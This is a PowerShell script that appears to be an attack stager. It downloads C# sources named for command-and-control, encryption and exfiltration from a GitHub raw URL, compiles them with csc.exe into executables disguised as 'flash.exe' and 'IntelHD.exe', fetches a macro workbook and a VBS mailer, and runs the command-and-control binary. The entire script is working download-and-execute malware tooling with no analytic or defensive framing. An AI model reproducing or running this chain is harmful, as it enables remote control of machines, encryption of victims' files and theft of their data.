$b=new-object net.webclient;
$b.proxy=[Net.WebRequest]::GetSystemWebProxy();$b.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;

#Part 1 - CC
$my_path="D:\cexec.cs"
$url='https://raw.githubusercontent.com/FurqanKhan1/D/master/cexec.cs';
$b.DownloadFile($url, $my_path) ;
$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\cnc.exe D:\cexec.cs"
invoke-expression $command
$command1="cmd /C D:\cnc.exe"
#invoke-expression $command

#Part 2 - Encrypt
$my_path_c="D:\encoding.cs"
$url_c='https://raw.githubusercontent.com/FurqanKhan1/D/master/encoding.cs';
$b.DownloadFile($url_c, $my_path_c) ;
$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\flash.exe D:\encoding.cs"
invoke-expression $command
$command2="cmd /C D:\flash.exe"
#invoke-expression $command

#Part 3 - Exfil
$my_path_k="D:\exfil.cs"
$url_k='https://raw.githubusercontent.com/FurqanKhan1/D/master/exfil.cs';
$b.DownloadFile($url_k, $my_path_k) ;
$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:D:\IntelHD.exe D:\exfil.cs"
invoke-expression $command
$command3="cmd /C D:\IntelHD.exe"
#invoke-expression $command

#Part 4 - Download 
$my_path_d="D:\Automate.xlsm"
$url='https://raw.githubusercontent.com/FurqanKhan1/D/master/Automate.xlsm';
$b.DownloadFile($url, $my_path_d) ;

#Part 5 - Mail
$my_path_m="D:\so.vbs"
$url='https://raw.githubusercontent.com/FurqanKhan1/D/master/so.vbs';
$b.DownloadFile($url, $my_path_m) ;
$command4 = "cmd /C cscript "+$my_path_m
#invoke-expression $command
$comm=$command1
invoke-expression $comm
